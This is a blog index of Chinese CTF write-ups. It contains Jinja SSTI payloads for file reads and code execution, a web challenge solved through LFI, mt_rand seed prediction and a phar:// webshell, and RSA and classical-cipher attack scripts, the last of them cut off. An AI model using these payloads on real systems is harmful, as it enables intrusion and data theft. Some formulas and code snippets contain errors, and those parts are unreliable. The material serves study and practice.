<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SSTI的一些基本操作]]></title>
    <url>%2F2019%2F01%2F17%2FSSTI%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[简介记录一下SSTI的一些基本操作，方便以后使用。主要内容转载自该博客 任意文件读取POC123file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。找到file类的索引，在我的环境中&lt;type 'file'&gt;类的索引是40，我们就注入&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() &#125;&#125;可以通过以下语句绕过一些过滤&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()[40]('/etc/passwd')[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 第一种代码执行POC1234file类不仅去读文件，而且也可以向目标服务器的可写入路径中写文件，然后我们再通过SSTI漏洞第二种代码执行poc调用from_pyfile方法去compile文件并执行其中的内容。这就是一个二次进攻。将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('&lt;malicious code here&gt;') &#125;&#125;注入到SSTI漏洞点，然后在通过注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;调用编译过程。该代码在编译时将会被执行。这就实现了远程代码执行。 第二种代码执行POC：充分地利用from_pyfile方法。123将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') &#125;&#125;注入到SSTI漏洞点，注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;来将新的项目添加到config对象中，将&#123;&#123; config['RUNCMD']('/usr/bin/id',shell=True) &#125;&#125;注入到SSTI漏洞点。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 NJCTF-Guess]]></title>
    <url>%2F2019%2F01%2F16%2F2017-NJCTF-Guess%2F</url>
    <content type="text"><![CDATA[简介这是一道2017年NJCTF的250分的Web题，刚好在XCTF的题库里刷到了，便记录下来。 解题思路首先打开题目，看见是一个上传页面，只允许上传gif|jpg|jpeg|png，在上传了一张png图片后提示成功 但并没有什么有用信息，我便扫了一下目录，也没有什么有用的地方。之后查看url，发现是http://111.198.29.45:30139/?page=upload,是一个文件包含漏洞，我便构造http://111.198.29.45:30139/?page=php://filter/read=convert.base64-encode/resource=upload读取upload.php的源代码，顺便也把index.php的源代码读了下来 index.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Upload&lt;/title&gt; &lt;link rel="stylesheet" href="http://fortawesome.github.io/Font-Awesome/assets/font-awesome/css/font-awesome.css"&gt; &lt;link rel="stylesheet" href="CSS/upload.css"&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="msg info" id="message"&gt; &lt;i class="fa fa-info-circle"&gt;&lt;/i&gt;please upload an IMAGE file (gif|jpg|jpeg|png)&lt;/div&gt;&lt;div class="container"&gt; &lt;form action="?page=upload" method="post" enctype="multipart/form-data" class="form"&gt; &lt;div class="file-upload-wrapper" id="file" data-text="Select an image!"&gt; &lt;label for="file-upload"&gt; &lt;input name="file-upload-field" type="file" class="file-upload-field" value="" id="file-upload"&gt;&lt;/label&gt; &lt;/div&gt; &lt;div class="div"&gt; &lt;input class="button" type="submit" value="Upload Image" name="submit"&gt; &lt;/div&gt; &lt;/form&gt; &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt; &lt;script src="js/filename.js"&gt;&lt;/script&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(0);session_start();if(isset($_GET['page']))&#123; $page=$_GET['page'];&#125;else&#123; $page=null;&#125;if(preg_match('/\.\./',$page))&#123; echo "&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"; die();&#125;?&gt;&lt;?phpif($page)&#123; if(!(include($page.'.php'))) &#123; echo "&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;error!&lt;/div&gt;"; exit; &#125;&#125;?&gt; upload.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?phperror_reporting(0);function show_error_message($message)&#123; die("&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");&#125;function show_message($message)&#123; echo("&lt;div class=\"msg success\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");&#125;function random_str($length = "32")&#123; $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9"); $str = ''; for ($i = 1; $i &lt;= $length; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; return $str;&#125;session_start();$reg='/gif|jpg|jpeg|png/';if (isset($_POST['submit'])) &#123; $seed = rand(0,999999999); mt_srand($seed); $ss = mt_rand(); $hash = md5(session_id() . $ss); setcookie('SESSI0N', $hash, time() + 3600); if ($_FILES["file"]["error"] &gt; 0) &#123; show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]); &#125; $check2 = ((($_FILES["file-upload-field"]["type"] == "image/gif") || ($_FILES["file-upload-field"]["type"] == "image/jpeg") || ($_FILES["file-upload-field"]["type"] == "image/pjpeg") || ($_FILES["file-upload-field"]["type"] == "image/png")) &amp;&amp; ($_FILES["file-upload-field"]["size"] &lt; 204800)); $check3=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION)); if ($check3) show_error_message("Nope!"); if ($check2) &#123; $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name']; if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) &#123; show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]); &#125; else show_error_message("Something wrong with the upload..."); &#125; else &#123; show_error_message("only allow gif/jpeg/png files smaller than 200kb!"); &#125;&#125;?&gt; 其中主要的部分还是upload.php。关键是上传路径部分。会用mt_rand()生成随机数并用random_str()方法生成随机上传路径。我们写入一句话到0.php中，然后压缩成0.zip并上传，将上传的cookie置0，服务器会返回一个cookie=5a7ef55999b2628d526fe7bf36eef6ec,cmd5网站解密得1188348307 得到的cookie的解密可以用于预测mt_rand的seed，可以使用php_mt_seed 之后编写php解密脚本解密随机路径，由于上一步我们预测得到了许多结果，一个一个试试就可以了12345678910111213141516&lt;?php $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9"); $seed=634631518; mt_srand($seed); $ss = mt_rand(); $str=""; for ($i = 1; $i &lt;= 32; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; echo $str;?&gt; 得到随机路径QxhcViJacOp5AZFFM1sG2hj4htW8cF7N访问http://111.198.29.45:30139/uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png可以发现预测成功 接下来构造http://111.198.29.45:30139/?page=phar://uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png/0,post的参数为ver=system(&#39;ls&#39;);,发现flag-Edi98vJF8hnIp.txt 其中page=phar://uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png/0会被index.php中的include($page.&#39;.php&#39;)解析为include(&#39;phar://uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png/0.php&#39;),也就会触发我们写进去的一句话 最后post的参数设为ver=system(&#39;cat flag-Edi98vJF8hnIp.txt&#39;);便可得到flag 总结还是挺有趣的，就是XCTF平台提交flag一直显示不对，好迷]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>Write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenSSL解RSA的基本操作]]></title>
    <url>%2F2019%2F01%2F16%2FOpenSSL%E8%A7%A3RSA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[简介本文主要是记录如何用OpenSSL解RSA的题目，我选取了一道XCTF训练营中的入门题目,这是一道来自于PCTF的题目。同时也附上题目下载地址 解题步骤1.从pubkey.pem中提取n和e1openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem 结果如下: n: C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDe: 65537 其中n转为10进制为87924348264132406875276140514499937145050893665602592992418171647042491658461 2.将n分解得到p和q利用yafu或factordb网站将n进行分解，得到 p: 319576316814478949870590164193048041239q: 275127860351348928173285174381581152299 3.用rsatool生成私钥文件:private.pem1python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239 4.用private.pem解密flag.enc得到flag1openssl rsautl -decrypt -in flag.enc -inkey private.pem]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>OpenSSL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XNUCA-baby_crypto]]></title>
    <url>%2F2019%2F01%2F12%2FXNUCA-baby-crypto%2F</url>
    <content type="text"><![CDATA[简介这道题是2018年XNUCA的一道密码题，当时由于自己比较菜没做出来，期末考试考完之后看书提到了重合指数破解Vigenere密码的内容，就想起来了这道题并开始复现一下。过程比较艰辛(自己太菜了),自闭了两三天终于弄出来了，也算是很开心，并于现在记录下来以备以后查看。 题目描述题目给的描述如下： The 26 letters a, b, c, …, y, z correspond to the integers 0, 1, 2, …, 25len(key_a) = mlen(key_k) = nc[i] = (p[i] * key_a[i % m] + key_k[i % n]) % 26 p is plain text, only lowercase letters are refered to.c is encrypted text I have appended the flag at the end of plain text, the format of which is like ‘flagis……’Now you have the encrypted text, Good luck! 并且题目给了encrypted_message，里面是大约1w多长度的密文，要求我们还原出来 基本概念重合指数法（index of coincidence，又称一致检索法）是Wolfe Friendman于1920年提出的方法。它可以进一步地检验多表代换密码的密钥长度。关于它的知识可以看这篇文章和这个问答 解题思路首先我们要确定的是m和n多久循环一次，这里可以使用拟重合指数法确定。如果是Vigenere密码则是确定密钥长度。 12345678910111213141516171819202122232425262728#使用拟重合指数法确定秘钥长度：拟重合指数大于0.6为标志def length(Ciphertext): ListCiphertext=list(Ciphertext) Keylength=1 while True: #指数初始化为０ CoincidenceIndex = 0 #使用切片分组 for i in range(Keylength): Numerator = 0 PresentCipherList = ListCiphertext[i::Keylength] #使用集合去重，计算每一子密文组的拟重合指数 for Letter in set(PresentCipherList): Numerator += PresentCipherList.count(Letter) * (PresentCipherList.count(Letter)-1) CoincidenceIndex += Numerator/(len(PresentCipherList) * (len(PresentCipherList)-1)) #求各子密文组的拟重合指数的平均值 Average=CoincidenceIndex / Keylength Keylength += 1 #均值＞0.6即可退出循环 if Average &gt; 0.06: break Keylength -= 1 return Keylength 确定的重合指数为6，则m和n的最小公因数就是6。之后我们可以将密文分为6组，分别统计每个字母的字频，以便接下来的分析 123456789101112131415#确定每个分组的字频def frequency(Ciphertext,keylength): ListCiphertext = list(Ciphertext) for i in range(keylength): # 使用切片分组 PresentCipherList = ListCiphertext[i::keylength] print("第",i+1,"组") #遍历移动的位数 for m in range(26): #从a到z的字母 Letter = chr(65+m) #统计字母频率 LetterFrequency = round(PresentCipherList.count(Letter)/ len(PresentCipherList),8) #输出结果 print("字母",Letter,"的频率是",LetterFrequency) 在字频中我们需要用到的有三个数据1.e的字频(大约在0.12左右)2.t的字频(大约在0.8左右)3.a的字频(大约在0.8左右)因为这三个字母的字频是最大且最容易区分(远大于其他字母)的，我们也就可以利用它们进行分析而在每个分组中我们都能找到和e,a,t三个字母相近频率的字母，我们可以将它们对应的位置保存下来以便接下来的使用。其中由于t和a的频率相近,所以我们会将它俩视作一起处理的数据 123e=[8,11,17,22,16,3] #e的位置aORt1=[7,3,13,4,8,10] #t或a的位置1aORt2=[10,12,24,21,17,25] #t或a的位置2 其中位置指的是在字母表中的位置(a为0)，如e数组中的第一个元素8就代表字母表中的i，也就是在第一个分组中加密算法将字母e加密为了字母i 接下来我们可以通过题目给的加密表达式推出p[i]和key_k的表达式$$p[i] = ((c[i]-key_k[i \%n]) \times inv(key_a[i \%m])) mod (26)$$$$key_k[i \%n] = (c[i]-(p[i] \times key_a[i \%m])) mod (26)$$ 其中inv(x)表示x的逆元 我们接下来要对key_a和key_k进行爆破。其中两个数组都分别有6项，每一项的取值范围都在(0,25)之间，如果直接爆破，时间复杂度是特别大的但是由于key_a数组需要求逆元，所以我们便可以对key_a的取值范围进行缩小来减小复杂度。最终我们确定下来key_a的取值在(1,3,5,7,9,11,15,17,19,21,23,25)之中之后我们通过上面的公式将key_k算出来(其中通过我们频率统计中统计出的e的位置确定c[i]的取值),并通过a和t的位置验证key_k的取值是否成立，如果成立则根据此时的key_a和key_k数组解密密文,我们便可以寻找有意义的答案，从而得到flag1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#通过字频进行爆破def brute(Ciphertext): #初始化key_a和key_ks key_a=[0,0,0,0,0,0] key_k=[0,0,0,0,0,0] #逆元数组 #inv = [1,9,21,15,3,19,7,23,11,5,17,25] inv = [0,0,0,0,0,0] #由于key_a需要求逆元，所以挑选出了可求逆元的数 a = [1,3,5,7,9,11,15,17,19,21,23,25] #爆破key_a数组 for a1 in a: for a2 in a: for a3 in a: for a4 in a: for a5 in a: for a6 in a: key_a[0]=a1 key_a[1]=a2 key_a[2]=a3 key_a[3]=a4 key_a[4]=a5 key_a[5]=a6 #算出每个位置上的key_k(根据e的频率) for i in range(6): key_k[i]=(e[i]-(4*key_a[i]))%26 flag = 0 #算出每个位置上的key_k(根据a和t的频率) for i in range(6): temp1 = (aORt1[i]-(19*key_a[i]))%26 temp2 = (aORt2[i]-(19*key_a[i]))%26 #判断算出的结果是否都满足e,a,t的频率分布，如果不满足则寻找下一个 if temp1!=key_k[i] and temp2!=key_k[i]: flag=1 break #寻找下一个 if flag==1: continue #求逆元 inv[0]=gmpy2.invert(a1,26) inv[1]=gmpy2.invert(a2,26) inv[2]=gmpy2.invert(a3,26) inv[3]=gmpy2.invert(a4,26) inv[4]=gmpy2.invert(a5,26) inv[5]=gmpy2.invert(a6,26) #计数，每6个位一循环进行解密 count=0 res="" for text in Ciphertext: t = ord(text)-65 r = ((t-key_k[count])*(inv[count]))%26 res+=chr(r+97) if count==5: count=0 else: count+=1 print("找到了可能的值！") print("key_a数组为:",key_a) print("key_k数组为:",key_k) print ("最后结果为：",res) 最终我们得到了flag 最终代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136# -*- coding: utf-8 -*-# !/usr/bin/env pythonimport gmpy2e=[8,11,17,22,16,3] #e的位置aORt1=[7,3,13,4,8,10] #t或a的位置1aORt2=[10,12,24,21,17,25] #t或a的位置2#使用拟重合指数法确定秘钥长度：拟重合指数大于0.6为标志def length(Ciphertext): ListCiphertext=list(Ciphertext) Keylength=1 while True: #指数初始化为０ CoincidenceIndex = 0 #使用切片分组 for i in range(Keylength): Numerator = 0 PresentCipherList = ListCiphertext[i::Keylength] #使用集合去重，计算每一子密文组的拟重合指数 for Letter in set(PresentCipherList): Numerator += PresentCipherList.count(Letter) * (PresentCipherList.count(Letter)-1) CoincidenceIndex += Numerator/(len(PresentCipherList) * (len(PresentCipherList)-1)) #求各子密文组的拟重合指数的平均值 Average=CoincidenceIndex / Keylength Keylength += 1 #均值＞0.6即可退出循环 if Average &gt; 0.06: break Keylength -= 1 return Keylength#确定每个分组的字频def frequency(Ciphertext,keylength): ListCiphertext = list(Ciphertext) for i in range(keylength): # 使用切片分组 PresentCipherList = ListCiphertext[i::keylength] print("第",i+1,"组") #遍历移动的位数 for m in range(26): #从a到z的字母 Letter = chr(65+m) #统计字母频率 LetterFrequency = round(PresentCipherList.count(Letter)/ len(PresentCipherList),8) #输出结果 print("字母",Letter,"的频率是",LetterFrequency)#通过字频进行爆破def brute(Ciphertext): #初始化key_a和key_ks key_a=[0,0,0,0,0,0] key_k=[0,0,0,0,0,0] #逆元数组 #inv = [1,9,21,15,3,19,7,23,11,5,17,25] inv = [0,0,0,0,0,0] #由于key_a需要求逆元，所以挑选出了可求逆元的数 a = [1,3,5,7,9,11,15,17,19,21,23,25] #爆破key_a数组 for a1 in a: for a2 in a: for a3 in a: for a4 in a: for a5 in a: for a6 in a: key_a[0]=a1 key_a[1]=a2 key_a[2]=a3 key_a[3]=a4 key_a[4]=a5 key_a[5]=a6 #算出每个位置上的key_k(根据e的频率) for i in range(6): key_k[i]=(e[i]-(4*key_a[i]))%26 flag = 0 #算出每个位置上的key_k(根据a和t的频率) for i in range(6): temp1 = (aORt1[i]-(19*key_a[i]))%26 temp2 = (aORt2[i]-(19*key_a[i]))%26 #判断算出的结果是否都满足e,a,t的频率分布，如果不满足则寻找下一个 if temp1!=key_k[i] and temp2!=key_k[i]: flag=1 break #寻找下一个 if flag==1: continue #求逆元 inv[0]=gmpy2.invert(a1,26) inv[1]=gmpy2.invert(a2,26) inv[2]=gmpy2.invert(a3,26) inv[3]=gmpy2.invert(a4,26) inv[4]=gmpy2.invert(a5,26) inv[5]=gmpy2.invert(a6,26) #计数，每6个位一循环进行解密 count=0 res="" for text in Ciphertext: t = ord(text)-65 r = ((t-key_k[count])*(inv[count]))%26 res+=chr(r+97) if count==5: count=0 else: count+=1 print("找到了可能的值！") print("key_a数组为:",key_a) print("key_k数组为:",key_k) print ("最后结果为：",res)if __name__ == '__main__': #这里输入的值不能完全读入，需要分两批读入并解密 Ciphertext = input("输入密文：").upper() Keylength = length(Ciphertext) print("密文的重合长度是",Keylength) #确定字频 frequency(Ciphertext,keylength) #爆破 brute(Ciphertext) 其中需要注意的是input的密文太长一次读不完，我们在找出key_a和key_k的解之后可以将密文分成两份分别解密 后记XNUCA的题目质量还是很高的，密码这边除了一道RSA公模攻击(签到题)之外还有一道有关量子密码通信的BB84协议题目，但是当我看到别人的write up并了解完BB84协议之后题目环境已经没了，对我来说还是比较可惜的。希望以后密码这边我能少自闭点，争取做出更多的题。]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Write up</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA攻击综述]]></title>
    <url>%2F2019%2F01%2F09%2FRSA%E6%94%BB%E5%87%BB%E7%BB%BC%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[简介RSA作为密码学中的代表，就和web中的php一样，被许多人不断研究，才有着今天这样广泛的使用程度。当然与此相对的也有许多的攻击方式被不断挖掘出来。这篇文章主要是对现阶段主流的RSA攻击方式进行总结，并配上exp脚本，以备以后的使用。 基本解法首先介绍的是RSA通常解法，也就是已知p,q,e和ciphertext的时候求d和plaintext 脚本如下：12345678910111213141516171819202122# -*- coding: utf-8 -*-import gmpy2print "素数p："p = input ()print "素数q："q = input ()n = p*qprint "公钥e："e = input ()print "密文ciphertext："ciphertext = input ()# d=invert(e,φ(n))，可见invert()函数解决 ed ≡ 1 (mod φ(n)) 问题d=gmpy2.invert(e,(p-1)*(q-1))print "私钥d：",dplaintext=pow(ciphertext, d, n)print "明文：",plaintext 对模数n的因子分解1.基本分解分解模数n是最直接的攻击方法，将n分解之后得到p,q，再通过p,q,e计算得到d，最后用d和n以及ciphertext求解plaintext分解模数n可以通过yafu或者factordb网站在线分解，之后使用常规解法求解即可 2.Pollard Rho rho算法其实是一种概率上的算法，虽然是靠概率，但是其准确率非常高（99.9%），更重要的是，该算法效率极高。其主要基于密码学当中的一个“生日悖论“来进行算法的设计。简单来讲就是，我们将N的两个因子x和y（就假设它有两个）从一大堆数里挑出来的概率非常小，但是如果我们挑满足x-y等于某个数的话，概率就要大很多。更进一步，如果我们找gcd(|x-y| ,N)呢？那么概率就会更大，就是这么个道理。关于Rho算法，要注意有可能会进入死循环，也就是说我们要在算法中对其进行判圈，具体的做法是，每次a=f(a)，再找一个b=f(f(b))，如果有一个时刻a=b那么就退出循环，因为b是以两倍的速度走得，当b追上了a，那么b至少已经走完一圈了。 脚本如下：1234567891011121314151617181920212223242526272829303132def gcd(a,b): while b != 0: t = b b = a % b a = t return adef Pollard_Rho(num): y = 2 x = 2 factor = 1 count = 0 if num==1: return 1 else: if num % 2 ==0: return 2 else: while factor == 1: if count %1000 == 0: print count x = (x*x + 1) % num y = (((y*y + 1) % num) ^ 2 + 1) % num factor = gcd( abs(x - y), num ) count += 1 return factorn = xxxres = Pollard_Rho(n)print (res) 3.Pollard P-1 这种方法是在p-1的素数分解式中不含有大于预定B值的素因数的情况下，找到一个基本的素数p，求出一个数的素因数。方法有点特殊，它只能应用在求整数n的一个素因子p，且p-1能被“小”因子整除的情况下，除此之外该方法无法正常应用。但是这个方法运用起来相当简单，所以在防止因式分解攻击时，必须考虑这一方法 脚本如下：123456789101112131415161718192021222324252627282930# Pollard's p-1 algorithm# https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm# this is really slow on stock python2, use either python3 or some JITerdef gcd(a,b): while b != 0: t = b b = a % b a = t return adef factor(n): a = 2 b = 2 while True: if b % 10000 == 0: print(b) a = pow(a, b, n) p = gcd(a - 1, n) if 1 &lt; p &lt; n: print("FOUND " + str(p)) return p b += 1n = xxxp = factor(n)print("p",p) 例题:ASIS-CTF-Finals-2017 Handicraft_RSA题目可以提取出加密脚本：12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/pythonfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom secret import s, FLAGdef gen_prime(s): while True: r = getPrime(s) R = [r] t = int(5 * s / 2) + 1 for i in range(0, t): R.append(r + getRandomRange(0, 4 * s ** 2)) p = reduce(lambda a, b: a * b, R, 2) + 1 if isPrime(p): if len(bin(p)[2:]) == 1024: return pwhile True: p = gen_prime(s) q = gen_prime(s) n = p * q e = 65537 d = inverse(e, (p-1)*(q-1)) if len(bin(n)[2:]) == 2048: breakmsg = FLAGkey = RSA.construct((long(n), long(e), long(d), long(p), long(p)))for _ in xrange(s): enc = key.encrypt(msg, 0)[0] msg = encprint key.publickey().exportKey()print '-' * 76print enc.encode('base64')print '-' * 76 以及一些output 1234567891011121314151617-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXsz9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsdsetnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpDffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+7/i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAAAQIDAQAB-----END PUBLIC KEY---------------------------------------------------------------------------------eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==---------------------------------------------------------------------------- 解题脚本:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import base64from Crypto.Util.number import *from Crypto.PublicKey import RSAdef gcd(a,b): while b != 0: t = b b = a % b a = t return a# Pollard's p-1 algorithm# https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm# this is really slow on stock python2, use either python3 or some JITerdef factor(n): a = 2 b = 2 while True: if b % 10000 == 0: print(b) a = pow(a, b, n) p = gcd(a - 1, n) if 1 &lt; p &lt; n: print("FOUND " + str(p)) return p b += 1def decrypt(n, p, q): assert p * q == n e = 65537 d = inverse(e, (p-1)*(q-1)) key = RSA.construct((long(n), long(e), long(d), long(p), long(q))) msg = base64.b64decode("eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==") for _ in xrange(20): enc = key.decrypt(msg) msg = enc print repr(msg)asciikey = """-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXsz9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsdsetnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpDffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+7/i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAAAQIDAQAB-----END PUBLIC KEY-----"""key = RSA.importKey(asciikey)n = int(key.n)# p = 139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001p = factor(key.n)q = n / pdecrypt(n, p, q) 公共模数攻击公共模数就是指用相同的n加密同一段密文，这样做是十分危险的，因为我们可以利用数学推导绕过d直接得到明文。具体的推导如下：我们假设m为信息明文，两个加密公钥分别为e1和e2，公共模数是n，则有$$C_1\equiv m^{e1} mod(n)$$$$C_2\equiv m^{e2} mod(n)$$ 因为e1与e2互质，故我们用欧几里得算法能够找到s1和s2满足下面的关系$$e_1^{s1}+e_2^{s2}=1$$ 式中的s1和s2皆为整数，但是一正一负。我们假设s1为正数，s2为负数因为$$C_1\equiv m^{e1} mod(n)$$$$C_2\equiv m^{e2} mod(n)$$ 所以$$(C_1^{s1}\times C_2^{s2}) mod(n) = ((m^{e1} mod(n))^{s1}\times (m^{e2} mod(n))^{s2}) mod(n)$$ 根据模运算性质，可以化简为$$(C_1^{s1}\times C_2^{s2}) mod(n) = ((m^{e1})^{s1}\times (m^{e2})^{s2}) mod(n)$$ 即$$(C_1^{s1}\times C_2^{s2}) mod(n) = (m^{e1^{s1}+e2^{s2}}) mod(n)$$ 又因为前面提到过$$e_1^{s1}+e_2^{s2}=1$$ 所以$$(C_1^{s1}\times C_2^{s2}) mod(n) = (m^1) mod(n)$$ 即$$C_1^{s1}\times C_2^{s2} = m$$ 这样我们就可以通过c1,c2,e1和e2得到密文了脚本如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding: utf-8 -*-from gmpy2 import invert#可以使用libnum包中的n2s或者自己写一个#from libnum import n2sdef n2s(num): t = hex(num)[2:] if len(t) % 2 == 1: return ('0'+t).decode('hex') return t.decode('hex')#欧几里得算法def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)if __name__ == '__main__': print "模数n：" n = input () print "密文C1：" c1 = input () print "密文C2：" c2 = input () print "公钥e1：" e1 = input () print "公钥e2：" e2 = input () s = egcd(e1, e2) s1 = s[1] s2 = s[2] #求模反元素 if s1&lt;0: s1 = - s1 c1 = invert(c1, n) elif s2&lt;0: s2 = - s2 c2 = invert(c2, n) m = 